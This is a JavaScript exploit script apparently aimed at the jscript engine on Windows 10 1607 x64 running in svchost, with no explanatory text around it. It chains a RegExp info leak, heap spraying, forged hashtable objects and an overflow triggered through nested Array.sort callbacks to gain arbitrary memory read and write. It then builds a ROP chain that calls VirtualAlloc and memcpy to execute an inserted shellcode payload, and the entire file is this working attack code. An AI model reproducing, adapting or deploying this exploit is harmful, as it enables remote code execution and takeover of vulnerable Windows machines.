

function breakpoint(msg) {
	Math.atan(msg);
}

function log(msg) {
	Math.acos(msg);
}

function print64(qw){
	return "qw: "+ Array(8-qw.dwh.toString(16).length+1).join("0") + qw.dwh.toString(16) + Array(8-qw.dwl.toString(16).length+1).join("0") + qw.dwl.toString(16);
}




///////////////////////////////////////////////////////////
//	    				  UTILS 	    				 //
///////////////////////////////////////////////////////////

function alloc_string(size, b) {
	var nChars = size/2;
	var r = nChars%b.length;
	var s1 = Array((nChars-r)/b.length + 1).join(b);
	var s2 = b.substr(0,r);
	return  s1+s2;
}

function fixNeg(dw) {
    if (dw < 0) {
        dw = (dw&0x7fffffff)+0x80000000;
    }
    return dw;
}

function read_dword(leak, offset) {
	var dw = 0;
	dw +=  leak.charCodeAt(offset);    
	dw +=  leak.charCodeAt(offset+1) << 16;
	return fixNeg(dw);
}

function dwordToUnicode(array) {
	var s = "";	
	for (var i=0; i<array.length; i++) {
		s += String.fromCharCode(array[i] & 0xFFFF, array[i] >> 16);
	}
	return s;
}

function qwToDoubleIEEE754(qw) {
	var dwh = qw.dwh;
	var dwl = qw.dwl;
	var sign = 1.0;		
	if (dwh&0x80000000) {
		sign = -1.0;
	}
	var exponent = (dwh>>20 & 0x7ff);
	var mantissa;
	if (exponent) {
		exponent = Math.pow(2, (dwh>>20 & 0x7ff) - 1023);
		mantissa = (dwh&0xfffff | 0x100000)*1.0/Math.pow(2, 20)  + dwl*1.0/Math.pow(2, 52);
	} else {
		exponent = Math.pow(2, -1022);
		mantissa = (dwh&0xfffff)*1.0/Math.pow(2, 20)  + dwl*1.0/Math.pow(2, 52);
	}
	return sign*exponent*mantissa;
}


function add64(qw, value) {
	var h = qw.dwh;
	var l = qw.dwl+value;
	if (l >= 0x100000000) {
        l = fixNeg(l&0xffffffff);
		h = h+1;/////
	}
	return {dwh:h, dwl:l};
}

function sub64(qw, value) {
	var h = qw.dwh;
	var l = qw.dwl;

	if (l < value) {
		h = h-1;/////
		l = (0x100000000+l) - value;
	} else {
		l = l - value;
	}
	return {dwh:h, dwl:l};
}

function shr4_64(qw) {
    var l = qw.dwl;
    var h = qw.dwh;
    var tmp = h&0x0F;
    h = h>>4;        
    l = fixNeg((tmp<<28) | (l>>>4));
    return {dwh:h, dwl:l};
}

function equal64(qw1, qw2) {
    return qw1.dwh==qw2.dwh && qw1.dwl==qw2.dwl;
}



var namesLen = 8000;
var names = Array(namesLen);
for (var i=0; i<namesLen; i++) {
	names[i] = alloc_string(0x50, i+"_NAME");
}

//win 10 1607 svchost 
var var1 = names[373]; var var1Hash = 0xb01db001; var var1Offset = 0x10+0x98*0;
var var2 = names[432]; var var2Hash = 0xc9f6300d; var var2Offset = 0x10+0x98*1;
var var3 = names[106]; var var3Hash = 0x6ee01c13; var var3Offset = 0x10+0x98*2;
var var4 = names[559]; var var4Hash = 0x70baf01f; var var4Offset = 0x10+0x98*3;
var var5 = names[618]; var var5Hash = 0x8a93702b; var var5Offset = 0x10+0x98*4;
var var6 = names[353]; var var6Hash = 0xbc699c37; var var6Offset = 0x10+0x98*5;


var mObj;
var fakeVARObjsAddr;
function readDW(qw) {
	mObj[var2] = mObj[var3]; 
	mObj[var1] = qwToDoubleIEEE754(add64(qw, 4));
	mObj[var2] = mObj[var4];
	var highBits = mObj[var1].length*2;

	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(add64(qw, 3));
	mObj[var2] = mObj[var4];
	var lowBit = (mObj[var1].length&0x80)>>7;

	return highBits+lowBit;
}

function readQW(qw) {
	var l = readDW(qw);
	var h = readDW(add64(qw, 4));
	return {dwh:h, dwl:l};
}

function writeQW(qwAddr, qwValue) {
	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var6Offset+8));
	mObj[var2] = mObj[var5];
	mObj[var1] = qwToDoubleIEEE754(qwValue);

	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(sub64(qwAddr, 0x10));
	mObj[var2] = mObj[var5];
	mObj[var1] = mObj[var6];
}


///////////////////////////////////////////////////////////
//	    				 STAGE 1	    				 //
///////////////////////////////////////////////////////////
log("[x] STAGE 1: Begin");

// Heap Spraying with strings
var arrayStringsLen = 1000;
var leakSize = 0x5000 - 0x3C;
var arrayStrings = new Array(arrayStringsLen);
var sA = alloc_string(leakSize, "A");
for (var i=0; i<arrayStringsLen; i++) {
    arrayStrings[i] = sA.substr(0, sA.length);
}
for (var i=1; i<arrayStringsLen; i+=2) {
    arrayStrings[i] = null;
}
CollectGarbage();



// Triggering the infoleak
var re = new RegExp(Array(0x2A).join('()'));
var target_str =  arrayStrings[arrayStringsLen/2];
target_str.search(re);
RegExp.input = (leakSize+0x800)/2;
var leak = RegExp.lastParen;


// Finding the leaked object address
/*
var offset = (leakSize-0x100)/2;
var tmp = read_dword(leak, offset);
while(tmp) {
    offset += 2;
    tmp = read_dword(leak, offset);
}
log("[x] Found null at offset: " + offset.toString(16));
//ofset 0x27e2
offset = offset + 2; // alignment
*/
var offset = 0x27E4;


// Verifying the next chunk has the proper size (checking if it had A's before being free)
tmp = read_dword(leak, offset + 0x30); 
var freedChunkAddr;
if (tmp == 0x00410041) {
    // Next chunck have size 0x5000
    var c = {dwh:read_dword(leak, (offset + 0x1C)+4/2), dwl:read_dword(leak, (offset + 0x1C))};
    freedChunkAddr = c;
} else {
    // Next chunk doesnt have size 0x5000
    var c = {dwh:read_dword(leak, (offset + 0x1C)+4/2), dwl:read_dword(leak, (offset + 0x1C))};
    freedChunkAddr = sub64(c, 0x5000 + 0x5000);
}
fakeVARObjsAddr = add64(freedChunkAddr, 0x10);


// Making the data that will be loaded at the leaked address
var payload = unescape("PAYLOAD");
var arrayFOLen = arrayStringsLen/2;
var arrayFO = new Array(arrayFOLen);
var fakeVariables =	
// Filler bytes
dwordToUnicode([0x00000000, 0x00000000, 0x00000000, 0x00000000])+
// Fake linked-list of objects pointed by a hashtable:
	//Object 1:
    dwordToUnicode([
	0x00000003, 0x00000000, 0x0000C0FE, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 
	var1Hash,   0x00000050,	0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var1 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 2:
	dwordToUnicode([
	0x0000400C, 0x00000000, fakeVARObjsAddr.dwl, fakeVARObjsAddr.dwh, 0x00000000, 0x00000000, 
	0x00000000, 0x00000000, var2Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 
	0x00000000, 0x00000000]) + var2 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 3:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000000, 
	var3Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var3 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 4:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 
	var4Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var4 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 5:
	dwordToUnicode([
	0x00000003, 0x00000000, 0x00000000, 0x00000000, 0x0000400C, 0x00000000, 0x00000000, 0x00000000, 
	var5Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var5 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 6:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000,	0x00000000, 0x00000000,	0x00000000, 0x00000000,
	var6Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var6 + dwordToUnicode([0x00000000, 0x00000000])+

	// Space to leak data
	dwordToUnicode([0x41414141, 0x41414141,	0x41414141, 0x41414141,	0x41414141, 0x41414141])+

	// Payload
    payload
;
var spaceToLeakAddr = add64(fakeVARObjsAddr, 0x10+0x98*6);
var payloadAddr = add64(fakeVARObjsAddr, 0x10+0x98*6+0x18);


// Filling the leaked-address hole
var ss = alloc_string(leakSize, fakeVariables);
for (var i=0; i<arrayFOLen; i++) {
	arrayFO[i] = ss.substr(0, ss.length);
}

log("[x] STAGE 1: Done!");




///////////////////////////////////////////////////////////
//	    				 STAGE 2	    				 //
///////////////////////////////////////////////////////////
log("[x] STAGE 2: Begin");
// For later filling some potential holes
var nBlockspf = 0x40;
var objspf = Array(nBlockspf);
for (var ii=0; ii<nBlockspf; ii++){
	var o = new Object();
	for (var i=0; i<300; i++) {
		o[names[i]] = i;
	}
	objspf[ii] = o;
}


// Heap Spraying - LFH with HashTables
log("[x] Pre HeapSpray!");
var nBlocks = 0x1000;
var iniFreeBlocks = 0x200;
var nFreeBlocks = 0xC00;
var objshs = Array(nBlocks);
for (var ii=0; ii<nBlocks; ii++){
    var o = new Object();
	for (var i=0; i<300; i++) {
        o[names[i]] = i;     // Allocs 0x400
    }
    objshs[ii] = o;
}
for (var ii=0; ii<nBlocks; ii++){
	for (var i=300; i<700; i++) {
        objshs[ii][names[i]] = i;     // Reallocs 0x2000
    }
}

log("[x] HeapSpray: making holes");
for (var ii=iniFreeBlocks; ii<iniFreeBlocks+nFreeBlocks; ii+=0x10){
	for (var i=700; i<namesLen; i++) {
		objshs[ii][names[i]] = i;   // Reallocs 0x10000
	}
}
CollectGarbage();
log("[x] HeapSpray done!");


// Filling some potential holes
for (var ii=0; ii<nBlockspf; ii++){
	for (var i=300; i<700; i++) {
        objspf[ii][names[i]] = i;     
    }
}


// Defining the function exploit() called inside the last callback that triggers the overflow
var arrayExLen = 0x100;
var arrayExMidPoint = 0xB4; //0xB4 allocs one of 0x21c0 y another one of 0x2d0
var arrayEx = new Array(arrayExLen);
function exploit() {
    // Constructing the object to trigger the overflow
	for (var i=0; i<arrayExMidPoint-1; i++) {
		arrayEx[i] = i;
	}

	var objAfterOverflow = {toString:function() {
        log("[x] Overflow Done!");
        try {            
    	    // Finding the overflowed hashtable
            var found = false;
            for (var ii=0; ii<nBlocks; ii++){
		        if (objshs[ii][var1] == 0xC0FE) {
			        mObj = objshs[ii];
                    found = true;
                    break;
		        }
            }
            if (!found) {
                return false;
            }
	        log("[x] Found!! MagicNumber: 0x" + mObj[var1].toString(16));


            // Fixing LFH block - Win10 1607 x64 Segment Heap 
            mObj[var6] = mObj;
            var v = readQW(add64(fakeVARObjsAddr, 0x10+0x98*5 + 0x08));
            var nameTbl = readQW(add64(v, 0x08));
            var nameList = readQW(add64(nameTbl, 0x10));
            var ovflBlock = readQW(add64(nameList, 0x38));

            // Fixing the overflow on the LFH - Win10 1607 x64 Segment Heap
            // Fixing value used as offset (0x05, always?)
            var offsetAddr = sub64(ovflBlock, 0x40);
            writeQW(offsetAddr, {dwh:0x00, dwl:0x05});
            // Fixing unused bytes 0x2200-0x21C0 ---> 0x4040  (not overwrited, so no need to fix it)
            log("[x] Fixing LFH block! - done!");


            // Fixing second overflowed buffer //WIN10 




            // Leaking stack pointer
            var stackPtr = readQW(add64(readQW(add64(nameTbl, 0x18)), 0x50));

            // Leaking jscript Address - Win10 1607 x64 Segment Heap
            var jscript = sub64(readQW(nameTbl), 0x8fa70); //offset to jscript!NameTbl::vtable

            // Finding ret address = jscript!ConvertToString+0x5b - Win10 1607 x64 Segment Heap
            var retValue = add64(jscript, 0x2ee17);

            // Adjusting stack pointer (stackPtr variable) so it points to the previous ret address
            tmp = readQW(stackPtr);
            while (!equal64(tmp, retValue)) {
                stackPtr = add64(stackPtr, 0x08);
                tmp = readQW(stackPtr);
            }

            // Leaking VirtualAlloc and memcpy addresses - Win10 1607 x64 Segment Heap
            var virtualProtect = readQW(add64(jscript, 0x98e00));
            var kernel32 = sub64(virtualProtect, 0x1bc10);
            var virtualAlloc = add64(kernel32, 0x1b210);
            var memcpy = readQW(add64(kernel32, 0x76660));
            var ntdll = sub64(memcpy, 0xab400);



            // Windows 10 1607 (x64) ROP
            // Loading ROP directly into the stack
            // Overwriting a return address that triggers the execution of the ROP chain
            writeQW(add64(stackPtr, 0x140), add64(jscript, 0x33377));       // # FF E0 # JMP RAX
            writeQW(add64(stackPtr, 0x138), memcpy);                        // memcpy()
	        writeQW(add64(stackPtr, 0x128), {dwh:0, dwl:0x2000});           // R8 = size = 0x2000
	        writeQW(add64(stackPtr, 0x120), {dwh:0, dwl:0x01});             // RCX = memdst = to be written
	        writeQW(add64(stackPtr, 0x118), payloadAddr);                   // RDX = memsrc = payloadAddr
	        writeQW(add64(stackPtr, 0x110), add64(ntdll, 0x951F0));	        // # 5A 59 41 58 41 59 C3 # POP RDX # POP RCX # POP R8 # POP R9 # RET
	        writeQW(add64(stackPtr,  0xE0), add64(jscript, 0x46A1));	    // # 48 89 43 68 48 8B C3 48 83 C4 20 5B C3 # MOV [RBX+68], RAX # MOV RAX, RBX # ADD RSP, 20 # POP RBX # RETN
	        writeQW(add64(stackPtr,  0xD8), add64(stackPtr, 0x120 - 0x68)); // RBX = ptr stack to save RAX (alloced memory)
	        writeQW(add64(stackPtr,  0xB0), add64(jscript, 0x2AAA2));	    // # 48 83 C4 20 5B C3 # ADD RSP, 20 # POP RBX # RETN
	        writeQW(add64(stackPtr,  0xA8), virtualAlloc);                  // VirtualAlloc()
	        writeQW(add64(stackPtr,  0xA0), {dwh:0, dwl:0x40});             // R9 = 0x40 = flProtect = PAGE_EXECUTE_READWRITE
	        writeQW(add64(stackPtr,  0x98), {dwh:0, dwl:0x3000});           // R8 = 0x3000 = flAllocationType = MEM_COMMIT | MEM_RESERVE
	        writeQW(add64(stackPtr,  0x90), {dwh:0, dwl:0x01});             // RCX = lpAddress = 0x00000000 = to be writen
	        writeQW(add64(stackPtr,  0x88), {dwh:0, dwl:0x4000});           // RDX = 0x4000 = dwSize
	        writeQW(add64(stackPtr,  0x80), add64(ntdll, 0x951F0));	        // # 5A 59 41 58 41 59 C3 # POP RDX # POP RCX # POP R8 # POP R9 # RET
	        writeQW(add64(stackPtr,  0x50), add64(jscript, 0x2A91D));	    // # 83 63 10 00 48 83 C4 20 5B C3 # AND [RBX+10], 0 # ADD RSP, 20 # POP RBX # RETN
	        writeQW(add64(stackPtr,  0x48), add64(stackPtr, 0x90 - 0x10));  // RBX = ptr stack to write 0
	        writeQW(add64(stackPtr,  0x00), add64(jscript, 0x2959));	    // # 48 83 C4 40 5B C3 # ADD RSP, 40 # POP RBX # RETN
        }catch(err) {
            log("[x] FHT - ERROR: " + err.name + " - " + err.message);
        }
        return "";
	}};


	var obj = {toString:function() {
        // Windows 10 1607 (x64) svchost
		arrayEx[arrayExMidPoint+ 1] = 0;
		arrayEx[arrayExMidPoint+ 2] = 0;
		arrayEx[arrayExMidPoint+ 3] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var1Offset));
		arrayEx[arrayExMidPoint+ 4] = 0;
		arrayEx[arrayExMidPoint+ 5] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var2Offset));
		arrayEx[arrayExMidPoint+ 6] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var3Offset));
		arrayEx[arrayExMidPoint+ 7] = 0;
		arrayEx[arrayExMidPoint+ 8] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var4Offset));
		arrayEx[arrayExMidPoint+ 9] = 0;
		arrayEx[arrayExMidPoint+10] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var5Offset));
		arrayEx[arrayExMidPoint+11] = 0;
		arrayEx[arrayExMidPoint+12] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var6Offset));

		arrayEx[arrayExMidPoint+13] = objAfterOverflow;
	}};
	arrayEx[0] = obj;


    // Triggering the overflow
    log("[x] Triggering Overflow!");
	Array.prototype.sort.call(arrayEx);
}


try {
    // Chaining some similar execution flows prior to the overflow to increase the odds
    var nCount = 0x20;
    var objsfh = Array(nCount);
    for (var k=0; k<nCount; k++){
	    var array = new Array(arrayExLen);
	    for (var i=0; i<arrayExMidPoint-1; i++) {
		    array[i] = i;
	    }
	    objsfh[k] = array;
    }
    for (var k=0; k<nCount-1; k++){
	    var o = new Object();
	    o.index = k;
	    o.toString = function() {
		    Array.prototype.sort.call(objsfh[this.index+1]);
	    };

	    objsfh[k][0] = o;
    }	
    var o = new Object();
    o.toString = function() {
        // Last callback that executes exploit()
	    var ret = exploit();
        log("[x] Exploit return value: " + ret);
    };
    objsfh[nCount-1][0] = o;

    // Triggering the nested calls 
    Array.prototype.sort.call(objsfh[0]);

}catch(err) {
    log("[x] MAIN: " + err.name + " - " + err.message);
}



